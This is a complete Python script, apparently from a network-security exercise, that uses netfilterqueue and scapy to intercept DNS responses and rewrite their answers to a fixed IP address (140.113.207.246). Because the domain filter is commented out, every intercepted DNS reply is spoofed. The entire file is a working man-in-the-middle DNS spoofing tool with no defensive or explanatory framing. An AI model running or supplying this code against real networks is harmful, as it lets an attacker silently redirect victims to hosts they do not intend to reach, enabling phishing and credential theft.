#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import os

def process_packet(packet):
    
    scapy_packet = scapy.IP(packet.get_payload())
    print("[+] Get target package, determine if it has DNS request")
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        # if "www.nycu.edu" in qname:
        print("[+] Spoofing target")
        answer = scapy.DNSRR(rrname=qname, rdata="140.113.207.246")
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1

        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len

        packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()